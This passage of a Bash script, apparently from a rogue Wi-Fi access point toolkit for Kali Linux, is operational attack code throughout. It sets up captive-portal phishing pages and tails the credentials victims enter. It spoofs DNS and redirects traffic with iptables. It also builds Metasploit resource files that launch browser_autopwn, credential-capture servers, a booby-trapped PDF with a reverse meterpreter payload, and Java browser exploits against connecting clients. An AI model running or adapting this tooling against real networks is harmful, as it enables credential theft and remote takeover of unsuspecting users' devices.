		fi



#end sslsplit


	fi

}


		if [[ $apusage == 3 ]]; then

			sslsplit_fn

			else

			echo -e "Sslsplit only available for Basic Menu 3 Sniffing"
			sleep 3

				fi






		sleep 2 # give time for sslstrip+ time to start

		fi



#var=ZZZ
#until [ $var == y ] || [ $var == n ]; do

#		echo ""
#		echo -e "$q\nTail sslstrip.log?$yel (y/n))$txtrst"
#		read var

#	if [[ $var != y ]] && [[ $var != n ]]; then

#	clear
#	echo ""
#	echo -e  "$warn  Wrong input enter $yel(y/n)$warn ONLY - try again!!!"
#	sleep 3

#		fi

#			done

#		echo -e "$q\nTail sslstrip.log?$yel (y/n))$txtrst"
#		read var

#		if [[ $var = y ]];then

#			Eterm -g 80x8-0+770 --cmod "red" --pointer-color "dark orange" -f DarkOrchid4 -b LightYellow1 -r --font-fx none --buttonbar 0  --scrollbar 0 -q -T "Sslstrip #Tail" -e tail -f /root/sslstrip.log 2> /dev/null &

#			if [[ $sslstrip == 1 ]]; then

#			xterm -g 80x8-0+770 -T "Sslstrip Tail" -e tail -f tee /root/SSLSTRIP_LOGS/sslstrip-$DATEFILE 2> /dev/null &

#			fi

#			if [[ $sslstrip == 2 ]]; then

#			xterm -g 80x8-0+770 -T "Sslstrip Tail+" -e tail -f /root/SSLSTRIP_LOGS/sslstripplus-$DATEFILE &

#			fi


#		fi


#	if [[ $sslstrip != n ]];then # any value other than n restarts the function
#        echo -e "$warn\nWhat's it gunna be babe...yes or no?"
#        sleep 2
#        sniff_fn
#	fi
#	sleep 2
#	echo -e "$info\nSniffing started"
#	sleep 1

	if [[ $ferret = y ]]; then
		echo -e "$info\nFerret will save a pcap dump in /root"
		sleep 1
	fi
	if [[ $ssluse == y ]];then
		echo -e "$info\nSslstrip log is in /root/SSLSTRIP_LOGS/sslstripplus-$DATEFILE"
		sleep 1
	fi

if [[ $ferret = y ]] || [[ $ssluse == y ]] || [[ $ssluse == Y ]]; then

	echo -e "$info\nConsider using yamas or easy-creds to parse logs"
	sleep 4

		fi

}

# ~~~~~~~~~~ Web Server Functions ~~~~~~~~~~ #

directory_select_fn()	
# Must set up directory structure properly!!! See intro notes.
{
    echo -e "$info\n  Setting up the web page"
    sleep 0.5
    echo -e "$warn\n  MUST have directory structure set up correctly"
    sleep 1
	if [[ $apusage == 4 ]];then 
        echo -e "$info\n  Use hotspot_3, or your own website"
        sleep 0.5
    fi

########Start Musket Adds Start####################
#########Select file from folder###################

WWWDIRTEST=ZZZ

until  [ $WWWDIRTEST == y ] || [ $WWWDIRTEST == Y ]; do  

echo -e "$txtrst "

#find /var/www/ -mindepth 1 -maxdepth 1 -type d | cut -c 10- | sort | tee /tmp/www_contentlist.txt &> /dev/null

# remove varous apache admin folders from list
# do no use the boolean or -e or -r due to support questions with sed

find /var/www/ -mindepth 1 -maxdepth 1 -type d | cut -c 10- | sort | sed '/access/d' | tee /tmp/www_contentlist02.txt &> /dev/null
sleep 1
cat < /tmp/www_contentlist02.txt | sed '/html/d' > /tmp/www_contentlist01.txt
cat < /tmp/www_contentlist01.txt | sed '/backups/d' > /tmp/www_contentlist.txt

# Make file list in folder to the wwwdir variable

www_contentlist=$(cat /tmp/www_contentlist.txt | nl -ba -w 1  -s ': ')

echo ""
echo -e "$info Captive Portals Web Folders listed in the$yel /var/www$info folder.$txtrst"
echo " "
echo "$www_contentlist" | sed 's/^/       /'
echo ""
echo -e "$inp    Select the$yel Web folder$inp to be used.$txtrst"
echo ""
read  -p "   Enter Line Number Here: " grep_Line_Number

echo -e "$txtrst"

wwwdir=$(cat /tmp/www_contentlist.txt | sed -n ""$grep_Line_Number"p")

echo ""

	while true
	do

echo ""
echo -e "$info You have chosen$yel $wwwdir$info as your webfolder."
echo -e "$inp Enter$yel (y/Y)$inp to confirm or$yel (n/N)$inp to try again.$txtrst"
read WWWDIRTEST

	case $WWWDIRTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"
	rm www_configlist.txt

	done

		done

if [[ $wwwdir == routerwpa3 ]]  || [[ $wwwdir == routerwpa5 ]] || [[ $wwwdir == javawpa2 ]] ;then

		wpaphish_fn

		fi

# Move any possible html, php file to /var/www/html so clients can acivate

	if  [[ $KALI_TYPE == 1 ]]; then

		rm -f /var/www/* 2> /dev/null

		fi


	if  [[ $KALI_TYPE == 2 ]] || [[ $KALI_TYPE == 3 ]]; then

		rm -f /var/www/html/* 2> /dev/null

		fi


#find /var/www/*/formdata.txt  -exec chmod 777 {} \; &> /dev/null
#find /var/www/*/"$txtfile"  -exec chmod 777 {} \; &> /dev/null

if  [[ $KALI_TYPE == 1 ]]; then

	cp -p /var/www/"$wwwdir"/* /var/www/ &> /dev/null

	fi

if  [[ $KALI_TYPE == 2 ]] || [[ $KALI_TYPE == 3 ]]; then

	cp -p /var/www/"$wwwdir"/* /var/www/html/ &> /dev/null

	fi

#cp -p /var/www/"$wwwdir"/* /var/www/html/ &> /dev/null


        if [[ $? -ne 0 ]] ;then   # checks exit code of last command ie did it work?
            echo -e "$warn\nError copying index"
            sleep 2
            directory_select_fn
        else 
            echo -e "$info\n"$wwwdir" files moved into position"
            sleep 3
        fi

	if  [[ $KALI_TYPE == 1 ]]; then

	rm -f /var/www/formdata*.txt

		fi

	if  [[ $KALI_TYPE == 2 ]] || [[ $KALI_TYPE == 3 ]]; then

	rm -f /var/www/html/formdata*.txt

		fi


rm -f /tmp/www_configlist*.txt


###########End Select file from folder End####
########End Musket Adds End###################

#    if [[ -d /var/www/"$wwwdir" ]];then
            mkdir /var/www/backups &>/dev/null      # make backup directory NB clear this out occasionally
#            mv /var/www/index.html /var/www//backups/index.html.`date +%Y%m%d%H%M` &>/dev/null  # back-up existing index files
#            mv /var/www/index.php /var/www/backups/index.php.`date +%Y%m%d%H%M` &>/dev/null
#    fi
####Musket add -p to cp command### 

#Kali2.0 new location for index 
#            cp -p /var/www/"$wwwdir"/index** /var/www/html/ #   copy index from phishing folder to var/www/hmtl

#        if [[ $? -ne 0 ]] ;then   # checks exit code of last command ie did it work?
#            echo -e "$warn\nError copying index"
#            sleep 2
#            directory_select_fn
#        else 
#            echo -e "$info\n"$wwwdir" files moved into position"
#            sleep 2
#        fi
#    else echo -e "$warn\nDirectory doesn't exist, eedjit" 
#        sleep 2
#        directory_select_fn	
#    fi

}

apache_fn()
{
    apache=$(ps aux|grep "/usr/sbin/apache2"|grep www-data) # check whether apache is running
		echo -e "$info\n  Checking if apache2 is running....?"
    if [[ -z "$apache" ]] ;then                             # if not,
        echo -e "$info\n"
        service apache2 start
        echo -e "$info"
        sleep 2
        apache=$(ps aux|grep "/usr/sbin/apache2"|grep www-data) # check has successfully started
        if [[ -z "$apache" ]] ;then
            echo -e "$warn\nApache failed to start - please resolve, then try again"
            sleep 4
            exit_fn
        else
		sleep 2
		echo -e "$info\n...success apache2 is functioning"
        fi
    else
	sleep 2
        echo -e "$info\nApache already running"
    fi
}

tail_txtfile_fn()
{

txttail=ZZZ
until [ $txttail == y ] || [ $txttail == n ]; do

clear
echo ""
echo -e "$bold$info  Storing Data Entered By Client(Phish)"
echo -e "$warn  _____________________________________$warn"
echo ""
	echo -e "$q\n    Do you want to tail the credentials text file?$yel (y/n)"
        echo -e "$info  Any information entered by the phish will be written"
        echo -e "$info  to the credentials text file you choose in the"
        echo -e "$info  in the$yel /var/www/$wwwdir$info web folder.$txtrst"
        echo -e "$info     Ignore any unrecognized file system warning in the xterm window"
        echo -e "$info  It will not effect the program.$txtrst"
	read txttail

	if [[ $txttail != y ]] && [[ $txttail != n ]]; then

	clear
	echo ""
	echo -e  "$warn  Wrong input enter $yel(y/n)$warn ONLY - try again!!!"
	sleep 3

		fi

			done


#	 echo -e "$q\n    Do you want to tail the credentials txtfile? (y/n)"
#        echo -e "$info  Any information entered by the phish will be written"
#        echo -e "$info  to the credentials txtfile you choose in the"
#        echo -e "$info  in the$yel /var/www/$wwwdir$info web folder.$txtrst"
#	 read txttail

	if [[ $txttail = y ]];then
#        echo -e "$def\n"
#		ls /var/www/$wwwdir
#		echo -e "$q\nEnter name of txtfile \n(usually formdata.txt)$txtrst"
#		read txtfile
#

######### Start Musket Add Start ###########
######### Select file from www folder##########
TXTFILETEST=ZZZ

until  [ $TXTFILETEST == y ] || [ $TXTFILETEST == Y ]; do  

wwwdirlen=${#wwwdir}

let wwwdirlen=$wwwdirlen+11

#echo "$wwwdirlen"

echo -e "$txtrst "

# find variable that idenities where to list

find /var/www/$wwwdir/ -mindepth 1 -maxdepth 1 -type f | cut -c $wwwdirlen- | sort | tee www_filelist.txt &> /dev/null

# Make file list in folder a variable

www_filelist=$(cat www_filelist.txt | nl -ba -w 1  -s ': ')

echo ""
echo -e "$info Files listed in the$yel /var/www/$wwwdir$info folder.$txtrst"
echo " "
echo "$www_filelist" | sed 's/^/       /'
echo ""
echo -e "$inp    Select the$yel credentials text file$inp to be used( usually$yel formdata.txt$inp ).$txtrst"
        echo -e "$info     Ignore any unrecognized file system warning in the xterm window"
        echo -e "$info  It will not effect the program."
echo -e "$yel  !!!$warn Select formdata.txt ONLY or no data will be written to file$yel!!! $txtrst"
echo ""
read  -p "   Enter Line Number Here: " grep_Line_Number

echo -e "$txtrst"

txtfile=$(cat www_filelist.txt | sed -n ""$grep_Line_Number"p")

echo ""

	while true
	do

echo ""
echo -e "$info You have chosen$yel $txtfile$info as your credentials text file."
echo -e "$inp Enter$yel (y/Y)$inp to confirm or$yel (n/N)$inp to try again.$txtrst"
read TXTFILETEST

	case $TXTFILETEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"
	rm -f www_filelist.txt

	done

		done

rm -f www_filelist.txt

###########End Select file from folder End############
########### End Musket Adds ################

		var="$(ls /var/www/$wwwdir|grep "$txtfile")" # tests whether $txtfile is valid 
		if [[ $var == "$txtfile" ]];then

#			Eterm -g 80x4-0+493 --cmod "red" --pointer-color "dark orange" -f DarkOrchid4 -b LightYellow1 -r --font-fx none --buttonbar 0  --scrollbar 0 -q -T "Textfile Tail" -e tail -f /var/www/"$wwwdir"/"$txtfile" 2> /dev/null &

			xterm -g 80x4-0+493 -T "Textfile Tail" -e tail -f /var/www/"$wwwdir"/"$txtfile" 2> /dev/null &

		else 
			echo -e "$warn\nBad typing - $txtfile doesn't exist"
			sleep 1
			tail_txtfile_fn
		fi
    elif [[ $txttail != n ]];then
        tail_txtfile_fn
	fi
    sleep 1
    echo -e "$info\nWeb Server attack running" 
}

dns_fn()
{
    echo -e "$q\nDNSspoof: do you want to spoof?
    
    1) all addresses
    2) use a custom hosts file$txtrst"
	echo -e "$inp Enter line number of choice:$txtrst"

    read var

    if [[ $var = 1 ]];then
        echo -e "$info\nStarting DNS spoofing..."


#        Eterm -g 80x6-0+373 --cmod "red" -f DarkOrchid4 --pointer-color "dark orange" -b LightYellow1 --font-fx none --buttonbar 0  --scrollbar 0 -q -T "DNSspoof" -e dnsspoof -i at0 2> /dev/null & 

        xterm -g 80x6-0+373 -T "DNSspoof" -e dnsspoof -i at0 2> /dev/null & 

	elif [[ $var = 2 ]];then

        echo -e "$q\nFor the hosts file
    1) I will supply it
    2) Let's make one! $txtrst"
	echo -e "$inp Enter line number of choice:$txtrst"
        read var

        echo $var
        if [[ $var = 1 ]];then
            echo -e "$info\nEnter the absolute path to the file.$txtrst"
            read dnspath
            if [[ -z $dnspath ]];then
                echo -e "$warn\nFile doesn't exist. Start again"
                sleep 2
                dns_fn
            fi
                
        elif [[ $var = 2 ]];then
            echo -e "$info\nWe will now enter the address(es), one at a time.\ne.g. www.microsoft.com\nCan use wildcards e.g. ???.microsoft.*$warn\nEnter a blank to escape from the loop."
            until [[ $var = "" ]];do    # loops until blank entered
                echo -e "$info\nEnter (next) address:\n(Enter a blank address to finish)$txtrst"
                read var
                if [[ -n $var ]];then
                    echo "192.168.0.1 $var" >> /tmp/custom.hosts
                fi 
            done
            echo -e "$info\nHere is the file:\n"
            cat /tmp/custom.hosts
            echo -e "$info\nIf you don't like it, edit it directly (/tmp/custom.hosts)\nPress enter to continue.$txtrst"
            read
            dnspath=/tmp/custom.hosts
           
        elif [[ $var != 1 && $var != 2 ]];then
            echo -e "$warn\nBad choice. Start again"
            sleep 2
            dns_fn
    	fi
        echo -e "$info\nStarting DNS spoofing..."

#        Eterm -g 80x6-0+373 --cmod "red" --pointer-color "dark orange" -f DarkOrchid4 -b LightYellow1 --font-fx none --buttonbar 0  --scrollbar 0 -q -T "DNSspoof" -e dnsspoof -i at0 -f $dnspath 2> /dev/null & 

        xterm -g 80x6-0+373 -T "DNSspoof" -e dnsspoof -i at0 -f $dnspath 2> /dev/null & 

    elif [[ $var != 1 && $var != 2 ]];then
        echo -e "$warn\nBad choice. Start again"
        sleep 2
        dns_fn  
    fi
}

# ~~~~~~~~~~ Karmetasploit ~~~~~~~~~~ #

# browser_autopwn may become deprecated soon
# it won't work against modern patched OS's
    
karmalaunch_fn()
{
    iptables -t nat -A PREROUTING -i at0 -j REDIRECT
    service apache2 stop # will interfere with metasploit's server
    cat /dev/null > /tmp/karma.rc > /dev/null # clear pre-existing karma.rc
    echo "use auxiliary/server/browser_autopwn" > /tmp/karma.rc
    echo "setg AUTOPWN_HOST $ap_ip" >> /tmp/karma.rc
    echo "setg AUTOPWN_PORT 55550" >> /tmp/karma.rc
    echo "setg AUTOPWN_URI /ads" >> /tmp/karma.rc
    echo "set LHOST $ap_ip" >> /tmp/karma.rc
    echo "set LPORT 45000" >> /tmp/karma.rc
    echo "set SRVPORT 55550" >> /tmp/karma.rc
    echo "set URIPATH /ads" >> /tmp/karma.rc
    echo "run" >> /tmp/karma.rc
    echo "use auxiliary/server/capture/pop3" >> /tmp/karma.rc
    echo "set SRVPORT 110" >> /tmp/karma.rc
    echo "set SSL false" >> /tmp/karma.rc
    echo "run" >> /tmp/karma.rc
    echo "use auxiliary/server/capture/pop3" >> /tmp/karma.rc
    echo "set SRVPORT 995" >> /tmp/karma.rc
    echo "set SSL true" >> /tmp/karma.rc
    echo "run" >> /tmp/karma.rc
    echo "use auxiliary/server/capture/ftp" >> /tmp/karma.rc
    echo "run" >> /tmp/karma.rc
    echo "use auxiliary/server/capture/imap" >> /tmp/karma.rc
    echo "set SSL false" >> /tmp/karma.rc
    echo "set SRVPORT 143" >> /tmp/karma.rc
    echo "run" >> /tmp/karma.rc
    echo "use auxiliary/server/capture/imap" >> /tmp/karma.rc
    echo "set SSL true" >> /tmp/karma.rc
    echo "set SRVPORT 993" >> /tmp/karma.rc
    echo "run" >> /tmp/karma.rc
    echo "use auxiliary/server/capture/smtp" >> /tmp/karma.rc
    echo "set SSL false" >> /tmp/karma.rc
    echo "set SRVPORT 25" >> /tmp/karma.rc
    echo "run" >> /tmp/karma.rc
    echo "use auxiliary/server/capture/smtp" >> /tmp/karma.rc
    echo "set SSL true" >> /tmp/karma.rc
    echo "set SRVPORT 465" >> /tmp/karma.rc
    echo "run" >> /tmp/karma.rc
    echo "use auxiliary/server/fakedns" >> /tmp/karma.rc
    echo "unset TARGETHOST" >> /tmp/karma.rc
    echo "set SRVPORT 5353" >> /tmp/karma.rc
    echo "run" >> /tmp/karma.rc
    echo "use auxiliary/server/fakedns" >> /tmp/karma.rc
    echo "unset TARGETHOST" >> /tmp/karma.rc
    echo "set SRVPORT 53" >> /tmp/karma.rc
    echo "run" >> /tmp/karma.rc
    echo "use auxiliary/server/capture/http" >> /tmp/karma.rc
    echo "set SRVPORT 80" >> /tmp/karma.rc
    echo "set SSL false" >> /tmp/karma.rc
    echo "run" >> /tmp/karma.rc
    echo "use auxiliary/server/capture/http" >> /tmp/karma.rc
    echo "set SRVPORT 8080" >> /tmp/karma.rc
    echo "set SSL false" >> /tmp/karma.rc
    echo "run" >> /tmp/karma.rc
    echo "use auxiliary/server/capture/http" >> /tmp/karma.rc
    echo "set SRVPORT 443" >> /tmp/karma.rc
    echo "set SSL true" >> /tmp/karma.rc
    echo "run" >> /tmp/karma.rc
    echo "use auxiliary/server/capture/http" >> /tmp/karma.rc
    echo "set SRVPORT 8443" >> /tmp/karma.rc
    echo "set SSL true" >> /tmp/karma.rc
    echo "run" >> /tmp/karma.rc
    sleep 1
    
    echo -e "$info\nLaunching karmetasploit..."

#    Eterm -g 104x25-0-0 --cmod "red" --pointer-color "dark orange" -f DarkOrchid4 -b LightYellow1 --font-fx none --buttonbar 0  --scrollbar 0 -T "Karmetasploit" -e msfconsole -r /tmp/karma.rc 2> /dev/null &

    xterm -g 104x25-0-0 -T "Karmetasploit" -e msfconsole -r /tmp/karma.rc 2> /dev/null &

    sleep 8
    echo -e "$info\nBe patient..."
    sleep 8
    echo -e "$info\nBe patient..."
    sleep 16
    echo -e "$info\nBe very patient..."
    sleep 24
    echo -e "$info\nCount the sessions!!!"
    sleep 8
    echo -e "$info\nLmao. You won't get any shells against modern systems ;-)"
    sleep 8
}

browser_autopwn_fn()
{
    dns_fn
    iptables -t nat -A PREROUTING -i at0 -j REDIRECT
    service apache2 stop
    sleep 0.5
    echo -e "$info\nMetasploit starting..."	
	cat /dev/null > /tmp/br_autopwn.rc > /dev/null # clear pre-existing karma.rc
    echo "use auxiliary/server/browser_autopwn" > /tmp/br_autopwn.rc
    echo "set LHOST $ap_ip" >> /tmp/br_autopwn.rc
    echo "set SRVHOST 0.0.0.0" >> /tmp/br_autopwn.rc
    echo "set SRVPORT 80" >> /tmp/br_autopwn.rc
    echo "set URIPATH /" >> /tmp/br_autopwn.rc
    echo "exploit" >> /tmp/br_autopwn.rc
    sleep 0.5
    echo -e "$info\nLaunching browser_autopwn..."

#    Eterm -g 104x25-0-0 --cmod "red" --pointer-color "dark orange" -f DarkOrchid4 -b LightYellow1 --font-fx none --buttonbar 0  --scrollbar 0 -T "Browser_autopwn" -e msfconsole -r /tmp/br_autopwn.rc 2> /dev/null &

    xterm -g 104x25-0-0 -T "Browser_autopwn" -e msfconsole -r /tmp/br_autopwn.rc 2> /dev/null &

    sleep 8
    echo -e "$info\nBe patient..."
    sleep 16
    echo -e "$info\nBe extremely patient..."
    sleep 32
    echo -e "$warn\n*** MUST STOP DNSSpoof as soon as you have a session ***
    
(if msf doesn't handle requests properly,
the victim will not get internet access,
and will probably disconnect)"
    sleep 16
    echo -e "$info\nWait..."
	sleep 60
	adv_final_fn
}

# ~~~~~~~~~~ Advanced Functions ~~~~~~~~~~ #

adv_usage_fn()
{
    clear
    apusage=
    echo -e "$def
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                                   Advanced Menu
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n
    $bold$inp a$yel)$info Captive portals (phish/sniff - for WPA Phishing but
       equipment intensive.)$norm
    
    $dim$inp b$yel)$dgrey Not Supported - Captive portal + PDF exploit
                        (targets Adobe Reader < v9.3)

    $dim$inp c$yel)$dgrey Not Supported - MSXML 0day (CVE-2012-1889: MSXML
                        Uninitialized Memory Corruption)
    
    $dim$inp d$yel)$dgrey Not Supported - Java_jre17_jmxbean$norm
    
    $bold$inp e$yel)$info Choose another browser exploit
         
         
    $inp q$yel)$info Exit from the script

    $inp z$yel)$info Return to basic menu:$txtrst
    "
    read apusage

	if [[ $apusage == b ]] || [[ $apusage == c ]] || [[ $apusage == d ]]; then

		echo -e "$info   Selection is not supported in this version."
		sleep 3
		adv_usage_fn

			fi

	if [[ $apusage = q ]];then
		exit_fn
    elif [[ $apusage = z ]];then
        first_fn
    elif [[ $apusage != a && $apusage != b && $apusage != c && $apusage != d && $apusage != e ]];then
        adv_usage_fn
    elif [[ $apusage = a || $apusage = b ]];then ###
        if [[ ! -e /usr/sbin/incrond ]];then 
            echo -e "$warn\nNeed to install incron"
            sleep 1
            echo -e "$q\nDo you want to do it now?$yel (y/n)$txtrst"
            read var
            if [[ $var == y ]];then
                apt-get install incron
            else
                adv_usage_fn
            fi
		fi
	fi
    service apache2 stop &> /dev/null
    setup_fn
}

adv_dir_fn()
{
    echo -e "$info\nSetting up the web page..."
    mkdir /var/www/backups &>/dev/null          # make backup directory NB clear this out occasionally
    mv /var/www/index.html /var/www//backups/index.html.`date +%Y%m%d%H%M` &>/dev/null  # back-up existing index files
    mv /var/www/index.php /var/www/backups/index.php.`date +%Y%m%d%H%M` &>/dev/null 


if  [[ $KALI_TYPE == 1 ]]; then

    cp /var/www/"$wwwdir"/index.* /var/www/     # copy index from phishing folder to var/www/

	fi

if  [[ $KALI_TYPE == 2 ]] || [[ $KALI_TYPE == 3 ]]; then

    cp /var/www/"$wwwdir"/index.* /var/www/html/     # copy index from phishing folder to var/www/html

	fi


    if [[ $? -ne 0 ]] ;then                     # checks exit code of last command ie did it work?
        echo -e "$warn\nError copying index"
        sleep 2
        adv_usage_fn
    else 
        sleep 0.5
        echo -e "$info\n$wwwdir/index moved into position"
        sleep 0.5
    fi
}

portals_fn()

{

WWWDIRTEST=ZZZ

until  [ $WWWDIRTEST == y ] || [ $WWWDIRTEST == Y ]; do  

echo -e "$txtrst "

#find /var/www/ -mindepth 1 -maxdepth 1 -type d | cut -c 10- | sort | tee /tmp/www_contentlist.txt &> /dev/null

# remove varous apache admin folders from list
# do no use the boolean or -e or -r due to support questions with sed

find /var/www/ -mindepth 1 -maxdepth 1 -type d | cut -c 10- | sort | sed '/access/!d' | tee /tmp/www_contentlist.txt &> /dev/null
sleep 1

# Make file list in folder to the wwwdir variable

www_contentlist=$(cat /tmp/www_contentlist.txt | nl -ba -w 1  -s ': ')

echo ""
echo -e "$info Web Folders listed in the$yel /var/www$info folder.$txtrst"
echo " "
echo "$www_contentlist" | sed 's/^/       /'
echo ""
echo -e "$inp    Select the$yel Web folder$inp to be used.$txtrst"
echo ""
read  -p "   Enter Line Number Here: " grep_Line_Number

echo -e "$txtrst"

wwwdir=$(cat /tmp/www_contentlist.txt | sed -n ""$grep_Line_Number"p")

echo ""

	while true
	do

echo ""
echo -e "$info You have chosen$yel $wwwdir$info as your webfolder."
echo -e "$inp Enter$yel (y/Y)$inp to confirm or$yel (n/N)$inp to try again.$txtrst"
read WWWDIRTEST

	case $WWWDIRTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"
	rm www_configlist.txt

	done

		done

if  [[ $KALI_TYPE == 1 ]]; then

	rm -f /var/www/* 2> /dev/null

	fi

if  [[ $KALI_TYPE == 2 ]] || [[ $KALI_TYPE == 3 ]]; then

	rm -f /var/www/html/*

	fi

#	rm -f /var/www/html/*

	# Handle interactive web page

	if [[ $wwwdir == routerwpa3access ]]  || [[ $wwwdir == routerwpa5access ]] || [[ $wwwdir == javawpa2access ]];then

		wpaphish_fn

		fi	

if  [[ $KALI_TYPE == 1 ]]; then

		cp -p /var/www/"$wwwdir"/* /var/www/ &> /dev/null

	fi


if  [[ $KALI_TYPE == 2 ]] || [[ $KALI_TYPE == 3 ]]; then

		cp -p /var/www/"$wwwdir"/* /var/www/html/ &> /dev/null
		echo "Moving Files"
		sleep 3
 

	fi

#	cp -p /var/www/"$wwwdir"/* /var/www/html/ &> /dev/null

	sleep 1
    
    adv_dir_fn

    if [[ $wwwdir == portal_simpleaccess ]];then 
        echo -e "$q\nWhat shall we call the portal?\n
        \"Welcome to ....(your name)\"
        e.g. Joe's Cybercafe, GoldmanSucks Private Net\n
        (Best to choose something similar to target)$txtrst"
        read var
        echo $var > /tmp/name   # will be read and displayed by index.php
    fi

    apache_fn


if [ $HTTPS_PASS == y ] || [ $HTTPS_PASS == Y ]; then

 	captive_iptab_fn1

		fi

if [ $HTTPS_PASS == n ] || [ $HTTPS_PASS == N ]; then

 	captive_iptab_fn

		fi

#    captive_iptab_fn
    
    # dnotify -M -t 99 -s /tmp/ip -e bash /tmp/ipmac & # whenever new MAC added, ipmac script is run # dnotify not available in kali repos unfortunately
    service incron start # therefore use inotify and incron
    # chkconfig incrond on
    echo "/tmp/ip/ip IN_MODIFY bash /tmp/ipmac" > /var/spool/incron/root # instruct incron to run script whenever a new mac is written ###(/etc/incron.d/root)
    echo -e "\e[1;34m"
    incrontab -d # reload the new incron table
    ### while inotifywait -r -e modify /tmp/ip; do bash /tmp/ipmac; done # can't background which stops script therefore no use

    tail_txtfile_fn
    sleep 4
    adv_final_fn 
}

pdf_fn()
{
    echo -e "$q\nWhat shall we call the portal?\n
    \"Welcome to ....(your name)\"
    e.g. Joe's Cybercafe, GoldmanSucks Private Net\n
    (Best to choose similar to AP essid).$txtrst"
    read var
    echo $var > /tmp/name   # will be read and displayed by index.php
    
    # thanks LHYX1 crypter.py
    echo -e "$q\nSelect the PDF\n$info
        1) Exploit: adobe_pdf_embedded_exe
           Payload: meterpreter/reverse_tcp
           Encoding: shikata-ga-nai X2
             (runs quickly, but may be detected by AV)
            
        2) Similar, obfuscated through LHYX1 crypter
            
        3) I will supply the PDF. $txtrst"
    read pdftype
    case $pdftype in
        1) pdf=aup1.pdf;;
        2) pdf=aup2.pdf;;
        3) echo "$warn\nName your file aup3.pdf
Include text: \"ACCESS CODE: 1367\", to allow victims through the captive portal
Place aup3.pdf in /var/www/portal_pdf/
Set permissions"
           pdf=aup3.pdf
           sleep 3;;
    esac
    echo $pdf >/tmp/pdf # value to be read by index.php
    
    wwwdir=portal_pdf    
    adv_dir_fn

    apache_fn

if [ $HTTPS_PASS == y ] || [ $HTTPS_PASS == Y ]; then

 	captive_iptab_fn1

		fi

if [ $HTTPS_PASS == n ] || [ $HTTPS_PASS == N ]; then

 	captive_iptab_fn

		fi

#    captive_iptab_fn


    echo -e "$info"
    service incron start
    echo -e "$info"
    
    echo "/tmp/ip/ip IN_MODIFY bash /tmp/ipmac" > /var/spool/incron/root # instruct incron to run script whenever a new mac is written ###(/etc/incron.d/root)
    incrontab -d # reload the new incron table
  
    if [[ $pdftype = 3 ]]; then
        echo -e "$warn\nYou will need to start the appropriate payload/handler in a separate shell"
        sleep 2
    else     # start metasploit-handler
        echo -e "$info\nReverse meterpreter handler starting..."
        cat /dev/null > /tmp/pdf.rc > /dev/null # clear pre-existing rc
        echo "use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST $ap_ip
set LPORT 443
set ExitOnSession false
exploit -j" > /tmp/pdf.rc
        sleep 0.5

#        Eterm -g 104x25-0-0 --cmod "red" --pointer-color "dark orange" -f DarkOrchid4 -b LightYellow1 --font-fx none --buttonbar 0  --scrollbar 0 -T "Metasploit Handler" -e msfconsole -r /tmp/pdf.rc 2> /dev/null &

        xterm -g 104x25-0-0 -T "Metasploit Handler" -e msfconsole -r /tmp/pdf.rc 2> /dev/null &

        sleep 8
        echo -e "$info\nTakes a while..."
    fi
    sleep 10
    adv_final_fn
 }

browser_exploit_fn()
{
    cat /dev/null > /tmp/msf.rc > /dev/null # clear pre-existing rc
    echo "search type:exploit path:browser app:client" > /tmp/msf.rc

#    Eterm -g 200x100-0-0 --cmod "red" --pointer-color "dark orange" -f DarkOrchid4 -b LightYellow1 --font-fx none --buttonbar 0  --scrollbar 0 -T "Metasploit" -e msfconsole -r /tmp/msf.rc 2> /dev/null &

    xterm -g 200x100-0-0 -T "Metasploit" -e msfconsole -r /tmp/msf.rc 2> /dev/null &

    echo -e "$info\nWe're going to build a resource file for msf
This will only work for exploits coded in the usual msf style, with standard options
If it fails, edit PwnSTAR directly: browser_exploit_fn"
    sleep 2
    echo -e "$q\nCopy and paste your chosen exploit:$txtrst"
    read exploit
    echo "use $exploit
show payloads" > /tmp/msf.rc
    echo -e "$info\nType exit within msf to close msf xterms"

#    Eterm -g 170x50-0-0 --cmod "red" --pointer-color "dark orange" -f DarkOrchid4 -b LightYellow1 --font-fx none --buttonbar 0  --scrollbar 0 -T "Metasploit" -e msfconsole -r /tmp/msf.rc 2> /dev/null &

    xterm -g 170x50-0-0 -T "Metasploit" -e msfconsole -r /tmp/msf.rc 2> /dev/null &

    sleep 2
    echo -e "$q\nCopy and paste your chosen payload:$txtrst"
    read payload
    
    echo -e "$info\nNeed to dns spoof to redirect victims to the metasploit webserver"
    dns_fn
    echo -e "$info\nMetasploit starting..."
    cat /dev/null > /tmp/msf.rc > /dev/null
    echo "use $exploit
set SRVHOST $ap_ip
set SRVPORT 80
set URIPATH /
set payload $payload
set LHOST $ap_ip
set LPORT 443
exploit -j" > /tmp/msf.rc ### custom exe? set EXE::Custom /var/www/mypayload.exe
    sleep 0.5

#    Eterm -g 104x25-0-0 --cmod "red" --pointer-color "dark orange" -f DarkOrchid4 -b LightYellow1 --font-fx none --buttonbar 0  --scrollbar 0 -T "Metasploit" -e msfconsole -r /tmp/msf.rc 2> /dev/null &

    xterm -g 104x25-0-0 -T "Metasploit" -e msfconsole -r /tmp/msf.rc 2> /dev/null &

    sleep 4
    echo -e "$info\nTakes a while..."
    sleep 4
    echo -e "$warn\n*** MUST STOP DNSSpoof as soon as you have a session ***
    
(if msf doesn't handle requests properly,
the victim will not get internet access,
and will probably disconnect)

Wait..."

    sleep 20
    adv_final_fn 
    }
    
java_jre17_jmxbean_fn ()
{
    echo -e "$info\nNeed to dns spoof to redirect victims to the metasploit webserver"
    dns_fn
    echo -e "$info\nMetasploit starting..."
    cat /dev/null > /tmp/msf.rc > /dev/null # clear pre-existing rc
    echo "use exploit/multi/browser/java_jre17_jmxbean
set SRVHOST $ap_ip
set SRVPORT 80
set URIPATH /
set payload java/meterpreter/reverse_tcp
set LHOST $ap_ip
set LPORT 443
